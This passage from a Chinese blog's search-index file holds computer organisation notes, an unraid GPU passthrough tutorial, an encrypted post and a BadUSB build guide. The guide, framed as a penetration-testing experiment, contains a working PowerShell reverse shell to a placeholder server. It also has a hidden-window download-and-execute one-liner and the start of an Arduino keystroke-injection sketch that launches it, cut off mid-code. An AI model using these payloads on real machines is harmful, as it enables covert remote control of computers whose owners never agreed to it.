110个。</li><li>CAN的通信介质可为双绞线、同轴电缆或光纤，选择灵活。</li><li>CAN节点在错误严重的情况下具有自动关闭输出功能，以使总线上其他节点的操作不受影响．</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【计算机组成原理】概论</title>
      <link href="/2024/03/12/"/>
      <url>/2024/03/12/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机系统简介"><a href="#计算机系统简介" class="headerlink" title="计算机系统简介"></a>计算机系统简介</h1><blockquote><p>分为软件和硬件</p></blockquote><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>软件指：由具有各类特殊功能的信息(程序)组成</p><p>软件又分为系统软件和应用软件</p><p>系统软件用来管理整个计算机系统</p><p>应用软件是按任务需要编制的各种程序</p><h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><p>硬件指：构成计算机的实体，如主机，外设</p><p>主板集成了处理器存储器输入输出控制器以及印刷线</p><script type="math/tex; mode=display">电子计算机\begin{cases}控制单元(CU)\\运算单元(ALU)\\存储器\\输入单元\\输出单元\\\end{cases}</script><p>计算机硬件系统基本组成</p><p><img src="/2024/03/12/硬件系统基本组成.png" alt="硬件系统基本组成"></p><h3 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h3><p>主板上的存储器<strong>可以被处理器直接访问</strong>，称为<strong>主存(Main Memory)</strong>，其特点是在断电后，主存信息会消失，“易失性存储器（Volatile Memory）”</p><p>其他硬件包括软盘驱动器，硬盘驱动器，光盘驱动器，以及联系它们的线缆</p><p>该机箱以及其中硬件统称<strong>主机</strong></p><blockquote><p>不包含输入/输出设备</p></blockquote><p><strong>辅助存储器(Secondary Memory,简称为辅存)</strong>，断电后这里数据不会消失，“非易失的存储器（Non-Volatile Memory）”</p><p>常见辅存有：</p><p>硬盘（Hard Disk ，HD）</p><p>软盘（Floppy Disk，FD）</p><p>光盘（Optical Disk Memory ODM）</p><p>磁带等</p><blockquote><p>处理器只与速度较快的主存交换信息，不直接访问辅存（确保工作效率）</p><p>辅存信息要装入主存才能给处理器使用</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p>通常将<strong>CU</strong>和<strong>ALU</strong>集成在一起，构成<strong>处理单元(Processing Unit,PU)</strong>,也叫处理器(Processor)</p><p>一台计算机通常只拥有一个PU，而它又是核心部件，故称为<strong>中央处理器（Central Processing Unit,CPU）</strong></p><p>一台计算机可以有多个PU，这样的叫做并行计算机（Parallel Computer）或高性能计算机（High Performance Computer）</p><p>PU的组成</p><script type="math/tex; mode=display">PU\begin{cases}控制单元CU \space CU是PU的指挥机构\begin{cases}1.程序计数器PC\\2.存放当前指令的指令寄存器IR\\3.解释指令的指令译码器ID\\4.发出各种命令信号的控制信号发生器CSG\\等\end{cases}\\算术逻辑单元ALU\begin{cases}1.加法器\\2.逻辑运算器\\3.移位器(Shifter)\\4.求补器(Complementer)\end{cases}\\寄存器 \space暂存单元\begin{cases}存放访存地址的寄存器MAR(Memory Access Register)\\存放与主存交换数据的寄存器MDR(Memory Data Register)(MBR)\\\end{cases}\\\end{cases}</script><p>在一个访存周期内</p><p>主存地址送入MAR $\Longrightarrow$启动读命令$\Longrightarrow$数据从主存写入MDR</p><p>或者</p><p>主存地址送入MAR且目标数据送入MDR $\Longrightarrow$启动写命令$\Longrightarrow$数据从MDR写入主存</p><h3 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h3><script type="math/tex; mode=display">主板(MotherBoard)\begin{cases}CPU插座\\CPU调压器\\主板芯片组\\存储器插座\\总线插槽\\两块特殊的集成电路芯片    \begin{cases}    CMOS\\    BIOS\\    \end{cases}\end{cases}</script><h4 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h4><blockquote><p>Basic Input-Output System</p><p><strong>程序为主</strong></p></blockquote><p>主板上的一个ROM芯片</p><p>存放了微机系统的基本输入输出程序、系统信息设置程序、开机上电自检程序、系统启动自举程序等</p><h4 id="CMOS"><a href="#CMOS" class="headerlink" title="CMOS"></a>CMOS</h4><blockquote><p>数据为主</p></blockquote><p>主板上的一个可读写的RAM芯片</p><p>存放了当前系统硬件配置、操作人员对某些参数的设定</p><h4 id="BIOS和CMOS的关系"><a href="#BIOS和CMOS的关系" class="headerlink" title="BIOS和CMOS的关系"></a>BIOS和CMOS的关系</h4><p>BIOS中的系统设置程序是完成CMOS参数设置的手段</p><p>CMOS RAM既是BIOS设定系统参数的存放场所，又是BIOS设定系统参数的结果</p><h2 id="计算机的解题过程"><a href="#计算机的解题过程" class="headerlink" title="计算机的解题过程"></a>计算机的解题过程</h2><p><img src="/2024/03/12/计算机的解题过程.png" alt="计算机的解题过程"></p><h1 id="计算机系统的层次结构"><a href="#计算机系统的层次结构" class="headerlink" title="计算机系统的层次结构"></a>计算机系统的层次结构</h1><p><img src="/2024/03/12/层次结构.png" alt="层次结构" style="zoom:50%;"></p><p><img src="/2024/03/12/层次结构2.png" alt="层次结构2" style="zoom:50%;"></p><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>用户使用计算机时看到的这些软件的界面</p><blockquote><p>这些软件的界面就是计算机所具有功能的具体体现</p></blockquote><p>虚拟机实现途径有两种：解释和翻译</p><p>解释是指在执行某一层机器的源程序时，其中的指令/语句是逐条地、实时替换成以下一层机器语言编写的等效程序段，然后在下一层机器上运行。</p><p>翻译是指某一层机器的源程序，在运行之前，先一次性地转换成以下一层机器语言编写的程序，然后在下一层机器上运行。</p><h1 id="计算机体系结构、组成与实现"><a href="#计算机体系结构、组成与实现" class="headerlink" title="计算机体系结构、组成与实现"></a>计算机体系结构、组成与实现</h1><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机体系结构是指程序员所看到的机器属性，即机器的概念性结构和功能表现</p><blockquote><p>同一家厂家生产的具有相同体系结构的计算机称为系列计算机（Family Computer）简称系列机</p></blockquote><p>软件兼容：同一个程序可以不加修改地在相同体系结构的各档机器上正确运行，唯一区别仅在于时间长短不同</p><blockquote><p>不同厂家生产的具有相同计算机体系结构的计算机称为兼容计算机，简称兼容机</p></blockquote><h2 id="计算机组成与计算机实现"><a href="#计算机组成与计算机实现" class="headerlink" title="计算机组成与计算机实现"></a>计算机组成与计算机实现</h2><p>计算机组成是计算机体系结构的逻辑实现。一种计算机体系结构可以有多种不同的计算机组成</p><p>计算机实现是计算机组成的物理实现。一种计算机组成也可以有多种不同的计算机实现</p><h2 id="计算机体系结构、组成与实现的关系"><a href="#计算机体系结构、组成与实现的关系" class="headerlink" title="计算机体系结构、组成与实现的关系"></a>计算机体系结构、组成与实现的关系</h2><p>等价性原理：硬件和软件在逻辑功能上等价。即软件的功能在原理上可以由硬件或固件来实现；硬件的功能在原理上也可以由软件的模拟来实现</p><p>计算机体系结构的核心是<strong>指令集（Instruction Set）</strong>指令集就是软硬件功能划分的界面</p><h1 id="计算机的基本组成"><a href="#计算机的基本组成" class="headerlink" title="计算机的基本组成"></a>计算机的基本组成</h1><h2 id="冯·诺伊曼计算机模型"><a href="#冯·诺伊曼计算机模型" class="headerlink" title="冯·诺伊曼计算机模型"></a>冯·诺伊曼计算机模型</h2><blockquote><p>将计算机的用途和硬件完全分离。引入“程序”和“存储器”，采用“存储程序的控制方案”</p></blockquote><h3 id="存储程序思想（冯·诺伊曼思想）"><a href="#存储程序思想（冯·诺伊曼思想）" class="headerlink" title="存储程序思想（冯·诺伊曼思想）"></a>存储程序思想（冯·诺伊曼思想）</h3><pre><code>将指令和数据以同一形式（二进制）存入计算机的同一存储装置（存储器）中，使得计算机在工作时能自动（不需人工干预）、高速地从存储器中取出指令加以执行，并自动转入到下一条指令执行。</code></pre><h3 id="冯·诺依曼计算机的基本组成："><a href="#冯·诺依曼计算机的基本组成：" class="headerlink" title="冯·诺依曼计算机的基本组成："></a>冯·诺依曼计算机的基本组成：</h3><pre><code>  基本组成：运算器、存储器、输入单元 、输出单元、控制器**。**</code></pre><h3 id="冯·诺伊曼计算机硬件框图"><a href="#冯·诺伊曼计算机硬件框图" class="headerlink" title="冯·诺伊曼计算机硬件框图"></a>冯·诺伊曼计算机硬件框图</h3><p><img src="/2024/03/12/冯诺伊曼硬件框图.png" alt="冯诺伊曼硬件框图"></p><h3 id="基本特征"><a href="#基本特征" class="headerlink" title="基本特征"></a>基本特征</h3><blockquote><p>组成</p></blockquote><p>计算机由运算器、存储器、输入/输出单元和控制器组成，以运算器为中心连接在一起</p><blockquote><p>存储器</p></blockquote><p>存储器由一组一维排列、线性编址的存储单元组成，每个存储单元的位数是相等且固定的，存储单元按地址访问</p><blockquote><p>程序</p></blockquote><p>程序是由一条条指令有序排列而成。而指令由操作码和地址码两部分组成</p><blockquote><p>二进制</p></blockquote><p>指令和数据均采用二进制数表示及运算</p><blockquote><p>相同</p></blockquote><p>程序(指令)与数据是同等的不加区分的存储在同一个存储器中</p><blockquote><p>PC</p></blockquote><p>设置程序计数器PC来指示下一条将要执行的指令的地址。每执行完一条指令，程序计数器自动加1，指向下一条指令的存储单元</p><h2 id="计算机硬件框图"><a href="#计算机硬件框图" class="headerlink" title="计算机硬件框图"></a>计算机硬件框图</h2><h3 id="以存储为中心的计算机"><a href="#以存储为中心的计算机" class="headerlink" title="以存储为中心的计算机"></a>以存储为中心的计算机</h3><p><img src="/2024/03/12/存储框图.png" alt="存储框图"></p><h3 id="现代计算机硬件框图"><a href="#现代计算机硬件框图" class="headerlink" title="现代计算机硬件框图"></a>现代计算机硬件框图</h3><script type="math/tex; mode=display">硬件\begin{cases}主机\begin{cases}CPU\\主存\end{cases}\\辅存\\I/O设备\begin{cases}输入设备\\输出设备\\\end{cases}\\\end{cases}</script><p><img src="/2024/03/12/现代框图.png" alt="现代框图"></p><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>冯·诺伊曼计算机是以一个部件为中心，五个部件互联的星型结构</p><p>这样是最简单的、连接链路最少的</p><p>由于外围四个部件只能与中心部件进行数据通信，且有的数据通路还是单向</p><p>故冯·诺伊曼计算机所需要的<strong>数据传送功能也最少、最简单</strong></p><p>冯·诺伊曼计算机：用最简单、最易于实现的思想来表示数据并实现运算，用最简单的互联结构来组成一台计算机</p><h2 id="计算机的工作步骤"><a href="#计算机的工作步骤" class="headerlink" title="计算机的工作步骤"></a>计算机的工作步骤</h2><h3 id="上机前准备"><a href="#上机前准备" class="headerlink" title="上机前准备"></a>上机前准备</h3><p>建立数学模型</p><p>确定计算方法</p><p>编制解题程序</p><h3 id="计算机的解题过程-1"><a href="#计算机的解题过程-1" class="headerlink" title="计算机的解题过程"></a>计算机的解题过程</h3><h4 id="存储器的基本组成"><a href="#存储器的基本组成" class="headerlink" title="存储器的基本组成"></a>存储器的基本组成</h4><p>存储单元：存放一串二进制代码</p><p>存储字：存储单元中二进制代码的组合</p><p>存储字长：存储单元二进制代码的位数；每个单元赋予一个地址号</p><p>按地址寻访</p><p><img src="/2024/03/12/存储器.png" alt="存储器" style="zoom:50%;"></p><p>MAR 存储器地址寄存器 反映存储单元个数 MAR n位 则存储单元个数为$2^n$个</p><p>MDR 存储器数据寄存器 反映存储字长 MDR n位 则存储字长为n</p><h4 id="运算器的基本组成"><a href="#运算器的基本组成" class="headerlink" title="运算器的基本组成"></a>运算器的基本组成</h4><p><img src="/2024/03/12/运算器的基本组成.png" alt="运算器的基本组成"></p><h4 id="控制器的基本组成"><a href="#控制器的基本组成" class="headerlink" title="控制器的基本组成"></a>控制器的基本组成</h4><p><img src="/2024/03/12/控制器的基本组成.png" alt="控制器的基本组成"></p><h4 id="主机完成一条指令的过程"><a href="#主机完成一条指令的过程" class="headerlink" title="主机完成一条指令的过程"></a>主机完成一条指令的过程</h4><h5 id="取数指令"><a href="#取数指令" class="headerlink" title="取数指令"></a>取数指令</h5><p><img src="/2024/03/12/取数指令.png" alt="取数指令"></p><h5 id="存数指令"><a href="#存数指令" class="headerlink" title="存数指令"></a>存数指令</h5><p><img src="/2024/03/12/存数指令.png" alt="存数指令"></p><h1 id="计算机硬件的主要技术指标"><a href="#计算机硬件的主要技术指标" class="headerlink" title="计算机硬件的主要技术指标"></a>计算机硬件的主要技术指标</h1><h2 id="机器字长"><a href="#机器字长" class="headerlink" title="机器字长"></a>机器字长</h2><blockquote><p>CPU一次能处理数据的位数，与CPU中寄存器的位数有关</p></blockquote><h2 id="运算速度"><a href="#运算速度" class="headerlink" title="运算速度"></a>运算速度</h2><p>主频</p><p>吉普森法 $T_M=\sum^n_{i=1}f_it_i$</p><p>MIPS 每秒执行百万条指令</p><p>CPI 执行一条指令所需的时钟周期数</p><p>FLOPS 每秒浮点运算次数</p><h2 id="存储容量"><a href="#存储容量" class="headerlink" title="存储容量"></a>存储容量</h2><blockquote><p>存放二进制信息的总位数</p><p>存储单元个数 × 存储字长</p></blockquote><p>几个单位</p><script type="math/tex; mode=display">\begin{flalign}&1K=2^{10}\\&1M=2^{20}\\&1G=2^{30}\\&1B=2^3b\\&下例：\\&2^{13}=1KB\\&2^{31}=256MB\\\end{flalign}</script><h2 id="主频"><a href="#主频" class="headerlink" title="主频"></a>主频</h2><p>主频的倒数叫时钟周期</p><p>执行一个程序的所需的处理器时间可用 <strong>该程序指令条数×CPI×时钟周期</strong>来估算</p><h2 id="存储器的存取周期"><a href="#存储器的存取周期" class="headerlink" title="存储器的存取周期"></a>存储器的存取周期</h2><p>即对存储器进行一次完整的读/写操作所需的全部时间，也是连续对存储器进行存/取的最小时间间隔，称为存储器的存取周期。</p><p>半导体存储器的存取周期在几十到上百纳秒$10^{-9}s,ns$之间</p><p>磁盘存取周期在10毫秒$10^{-3},ms$以上</p><h2 id="功耗"><a href="#功耗" class="headerlink" title="功耗"></a>功耗</h2><p>功耗随主频和片内晶体管数量的提高而提高。现代处理器功耗峰值超过100w</p><blockquote><p>移动计算领域功耗是压倒一切的性能指标</p></blockquote><h2 id="软件兼容性"><a href="#软件兼容性" class="headerlink" title="软件兼容性"></a>软件兼容性</h2><p>软件兼容可分为向上(下)兼容和向前(后)兼容</p><p>“向上（下）兼容”是指为某档机器编制的软件，不加修改就可以正确运行在比它更高（低）档的机器上；“向前（后）兼容”是指为某个时期投入市场的某种型号机器编制的软件，不加修改就可以正确运行在比它早（晚）投入市场的相同型号机器上。</p><p><strong>系列机之间必须能够做到“向后兼容” ，力争做到“向上兼容”，对于“向下兼容”或“向前兼容”不做要求**</strong>。**</p><h2 id="系统软件配置"><a href="#系统软件配置" class="headerlink" title="系统软件配置"></a>系统软件配置</h2><p>常见的系统软件有：操作系统、数据库系统、文本编辑器、高级语言程序开发环境、互联网浏览器</p><h2 id="吞吐率和响应时间"><a href="#吞吐率和响应时间" class="headerlink" title="吞吐率和响应时间"></a>吞吐率和响应时间</h2><p>吞吐率是指计算机系统在单位时间内完成的任务数</p><p>响应时间是指用户在输入命令或数据后得到第一个结果的时间间隔</p><h2 id="辅助存储器容量"><a href="#辅助存储器容量" class="headerlink" title="辅助存储器容量"></a>辅助存储器容量</h2><blockquote><p>决定了计算机系统能存储的信息总量</p></blockquote><h2 id="可拓缩性"><a href="#可拓缩性" class="headerlink" title="可拓缩性"></a>可拓缩性</h2><p>一个计算机可以在保持软件兼容性的同时，可向上拓展获得更高性能，也可以向下收缩来降低价格</p><h2 id="RASIS特性"><a href="#RASIS特性" class="headerlink" title="RASIS特性"></a>RASIS特性</h2><p>可靠性（reliability）</p><p>可用性（availability）</p><p>可服务性/可维护性（serviceability）</p><p>完整性（integrality）</p><p>安全性（security）</p><blockquote><p> 可靠性用“平均无故障时间(Mean Time To Failure，MTTF)”或“平均故障间隔时间(Mean Time Between Failure，MTBF)”来衡量，可服务性/可维护性用“平均修复时间(Mean Time To Repair，MTTR)”来衡量。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新杂谈1</title>
      <link href="/2024/03/07/"/>
      <url>/2024/03/07/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1c411601640275ff7a23e386effb1d99533a51a44f0cc2c94e865abf2055ab63">bd25ed9264b080267271e137e33d0ce118960a041ac35a180347d4bc9710c7dce0caf115d93c1043154419c92f7d4562dc05f4ccf0db0a81cd52b98b78081e92b5c618035e200aa0e54a212e1723546e4d160c5f0c2d4ed36c6b7aa10968e25024a0892bd0bb3a294f729cd045dcf27ed3c30d324cca9c58b40b3f5fe90cc16f12e6160ae756e0656c730986025c605f43cac131be51f25ed84bb2fc9c00b13dcf0cac63726f39f676d29a8feed271c1137874643e48fcea30c2474c8e7733f1bb119ba1ed92e69edc7e8c16811eb788d8d176828b6b6523dd6463e8dc3a3679071cc33ce45338b6207624d4388f099b342b7374637adb2772344d6ddf9fbb2511bc3ab2404227e427a531e6499a79b3ec28ffd943b91fa777a81fa96a252cc0d22eca766b73c4686698aaa9a7e55c140188f580cdf905f0cf76ca479aa16e71ceb51d9fc85cb54293812f071e779c0249b7b2b1c5e908d6571f990ee19ddc457e10f6e62f41ec934f79bfb62f9fd942f637d3608e2cf856e620006c6a15472c327a8e36d2d8ca936dfb9083b780616f778383fc3be40d451fca18addd4a4548bd1a94626a1b7157b73d1185bc719cedd66093f113078da467fa9a84701905fdf94a8d726658f500941ec239bdaafa29f1fc0cdb96a6c5e34f9e2d1a466595a567c02646ef10232ba2ed14dcaeccef2cc30a7d2f4b25ad6bf61f52d94c0ccbf13177591bf396a588ef7ad4050b3a763bd653fc6bce7a3ced5c01da98aa672252e4ae07d2ca4304d0411d36824526bc87686bae13bec1f4b601bbc9baf9d6594d3bad801839eadc88432257576c32c2f55b9dbed2a358b0bc10ed5efea31f5a0b50eafec09a0ce5a217f8f15e28e034939377cf2aea668a9d4724fb8ae81e169d3e317eca630a26b8556ae54ff39f26721c21f607cfdee56a78a4963f91932d50147a2618db43ce0e82bd179018c6b2d5064ffb12d0d82494d9dda96b63badbb1273bb0b2ccdeddb0a184ddcf33ec6747d44ffe9ca5c9d10625d6d942615228b7112e5a38a78139fbd524d97649645873237dfee8e7e05a3be9726b18a34afa62c1c76729ac661631339f96b01df3a8b9a1a90ae102f83cd2ebe421a8fef2eec45d2c3929b1fb6053fd1e66b4452cee5d4c0a867d53f1a6dce1ad657facea556d2e9c2bf1b558a51590776cf83f734dda39dbe8e35bbb75abfb3724ff8de4c5e10f23b875746375234926802dddb6b6f872de20c5e5b2bbdd1e1c2e442a434399a5d7805b8aa3584c6a4354f129232eec34955517c9bafed998a25ec29fdc7d6829736fa612472cc8f2fe313f045fad7ada33c74758cbbd892c05b202ff403b9eb62e41bdda31f16140088358c50ab73c97548e4ca3ed1ea69bf50c04a125b156a3516c242008ebeb1f1a5182d375f46d07d83fb32c5f568a0be17377b1b1c8a6544233fe17efb77a5f6eaa5a3d529dcc8bdf7a8d36576c34f00525e18a0152d5d1a19ccf7643ece9d13ef6fcb8b82abf6ed3024c430abcf5967ac96f3d3f35a80f901bd3668b66c0de76f61b223687800988cf6870dd4991958a94f441c10c011f222feb4384971dd005762707cbcefa0cd78764287b950965c461bbf7ce3748a1602e75990c3acd287f057fab231a6b720d3af9e13d92f6a5b72abb398465653b95ddf60ef4428d4162574efa522a33d75b607e84db7939d2471d6f9c60aa03df28144e68bd77b550b0bcac5965a13e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 硬件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unraid直通显卡</title>
      <link href="/2024/03/06/"/>
      <url>/2024/03/06/</url>
      
        <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>从本文开始此博客更新于作者的unraid服务器！</p><p>本文提供unraid系统下将独立显卡直通给windows10 虚拟机的教程。国内教程少，且不具体，作者参考了部分帖子和油管视频写这篇文章，希望能给玩虚拟机直通的人有帮助。</p><p>本文环境为</p><p>unraid 6.12.8系统</p><p>虚拟机环境为windows 10 后文会贴出详细配置</p><p>显卡为Nvidia Zotac GTX 1070 Ti（这张显卡似乎有点毛病，一个风扇不转了）</p><h1 id="VMS-Manager-设置"><a href="#VMS-Manager-设置" class="headerlink" title="VMS Manager 设置"></a>VMS Manager 设置</h1><p>打开unraid WebUI</p><p>打开<strong>设置</strong> — <strong>虚拟机管理器</strong> 并打开高级视图</p><p>主要设置的就是<strong>PCIe ACS覆盖</strong> 基本设置为两者（both）或者多功能（multi- function）</p><p>VFIO允许不安全的中断可以选择<strong>是</strong></p><p>设置如下图：</p><p><img src="/2024/03/06/1.png" alt="1"></p><p>PCIe ACS覆盖的选择可以多尝试，成功的办法看后一节</p><h1 id="隔离显卡"><a href="#隔离显卡" class="headerlink" title="隔离显卡"></a>隔离显卡</h1><p>打开<strong>工具</strong> — <strong>系统设备</strong> 等待加载一会儿</p><p>可以看到加载出来的<strong>IOMMU group</strong></p><p>从这些组中找到N卡相关的组如图：</p><p>[<img src="/2024/03/06/2.png" alt="2"></p><p>只要能都打上勾，选择绑定，就成功隔离了显卡，这一步成功就代表上面PCIe ACS设置是正确的</p><p>此外，这一步会提示需要重启，重启成功后进行下一步操作。</p><p>重启完以后，unraid仪表盘如果下载有GPU statistics，就已经检测不到显卡了</p><h1 id="设置windows虚拟机"><a href="#设置windows虚拟机" class="headerlink" title="设置windows虚拟机"></a>设置windows虚拟机</h1><p>这一步要安装windows</p><p>无需多言，上配置图：</p><p>首先选择合适的CPU和内存，机器我这边选择i440fx ，Q35兼容性会好点</p><p>BIOS选择SeaBIOS兼容性好</p><p>Hyper-V就是是否虚拟化，选是就行</p><p>usb控制器，打上3.0就行</p><p>然后选择我们的win10镜像，这个镜像直接用ssh工具连上服务器以后传到isos里就可以被识别了</p><p>这个光盘总线都用sata，实测用其他的检测不到，需要加载驱动</p><p>VirtIO驱动很关键，只有它才能给你虚拟机上网，去前文VM Manager设置里下载最新的就行，然后这里能选它</p><p><img src="/2024/03/06/3.png" alt="3"></p><p>接下来是磁盘设置</p><p>我设置了多个盘，一开始测试直接自动就行，总线记得选sata一样的道理，其他的不用改</p><p><img src="/2024/03/06/4.png" alt="4"></p><p>显卡部分，我设置了两个输出</p><p>一个是VNC连接，避免显卡可能输出视频有问题的情况出现，可以先给显卡打上驱动（虽然貌似不会有显卡输出不了的问题，要是有，可以试试插拔一下DP/HDMI接口线）</p><p>第二个就是N卡，Rom BIOS不用填 声卡也选上</p><p>网络资源默认就行，USB设备选择你要连接的外设就行，一般键盘鼠标</p><p><img src="/2024/03/06/5.png" alt="5"></p><h1 id="驱动安装"><a href="#驱动安装" class="headerlink" title="驱动安装"></a>驱动安装</h1><p>安装系统不赘述</p><h2 id="网卡驱动"><a href="#网卡驱动" class="headerlink" title="网卡驱动"></a>网卡驱动</h2><p>安装完，会发现没网络。原因就是网卡驱动没有</p><p>解决办法：加载VirtIO驱动</p><p>打开文件管理器，会发现有个多出的盘，就是VirtIO驱动位置。</p><p>打开设备管理器，选择那个打⚠️的以太网接口，更新驱动，从本地那个VirtIO盘加载就行</p><p>这样就连上网了</p><h2 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h2><p>简单，上Nvidia官网安装对应驱动就行</p><p>安装完，设备管理器应该能识别到对应的显卡名字了</p>]]></content>
      
      
      <categories>
          
          <category> 硬件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unraid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BadUSB制作尝试</title>
      <link href="/2024/01/13/"/>
      <url>/2024/01/13/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文章是作者想要尝试一下近源渗透，于是购买了一个badusb进行制作。网上有不少教程，可惜有的不适配我的硬件，有的程序也过旧了，没有维护。于是自己总结了各路经验写下这个文章，希望感兴趣的可以制作一个自己的BadUsb。</p><h2 id="基本构思"><a href="#基本构思" class="headerlink" title="基本构思"></a>基本构思</h2><p>1.通过烧录指定的程序进入badusb</p><p>2.攻击机开启nc监听服务</p><p>3.目标机插入badusb后，会自动打开终端，并主动连接攻击机，弹出shell，从而攻击机获得控制权</p><h2 id="硬件选择"><a href="#硬件选择" class="headerlink" title="硬件选择"></a>硬件选择</h2><p>查看了各方资料，发现Rubber Ducky和hak5之类的usb确实效果很牛，并且已经集成了功能。但很贵，同时我意在自己制作一个。最后决定购买Arduino Leonardo这款badusb ，我在某鱼上购买，质量还不错。</p><p>badusb的本质是一个单片机，可模拟键盘操作。实际上是一种HID（Human interface device），即人体学接口设备。</p><p>很多类似产品都可以实现该项目。</p><h2 id="环境要求及搭建"><a href="#环境要求及搭建" class="headerlink" title="环境要求及搭建"></a>环境要求及搭建</h2><p>电脑：Windows11+Kali Linux</p><p>云服务器：Debian 1台（局域网内测试可省略）</p><p>攻击机linux需要搭建简单的web下载服务，在此不赘述。</p><p>安装nginx服务后配置nginx.conf即可</p><p>这里作者用kali安装了Arduino用于单片机编程及烧录，事实上什么机子都行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install Arduino</span><br></pre></td></tr></table></figure><p>如果启动失败，大概率需要更新java</p><p>在监听机下安装netcat：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install netcat</span><br></pre></td></tr></table></figure><h2 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h2><h3 id="shell连接"><a href="#shell连接" class="headerlink" title="shell连接"></a>shell连接</h3><p>我的主要目标是连接到攻击机的监听端口上去。下面这段程序中,表示创建了一个socket连接到指定的server_ip的server_port端口。同时反向shell连接了攻击机。把这段代码贴到powershell里应该可以直接连上攻击机。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&#x27;server_ip&#x27;</span>,server_port);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&#x27;PS &#x27;</span> + (<span class="built_in">pwd</span>).Path + <span class="string">&#x27;&gt; &#x27;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br></pre></td></tr></table></figure><p>可以把这段代码放到一个ps1文件里，我命名为crack.ps1。</p><h3 id="Keyboard模拟"><a href="#Keyboard模拟" class="headerlink" title="Keyboard模拟"></a>Keyboard模拟</h3><p>代码作用：</p><p>模拟键盘通讯，按下win+r键，并开启大写锁定以屏蔽输入法。输入指令弹出powershell并最小化，执行服务器上下载的ps1脚本</p><p>这一段话的大小写是相反的，因为实操中发现事实上打出的字大小写会互换</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POWERSHELL -wINDOWsTYLE hIDDEN -cOMMAND &amp; &#123; iNVOKE-eXPRESSION ((nEW-oBJECT nET.wEBcLIENT).dOWNLOADsTRING(&#x27;HTTP://your_server_ip/CRACK.PS1&#x27;)) &#125;</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Keyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时</span></span><br><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  <span 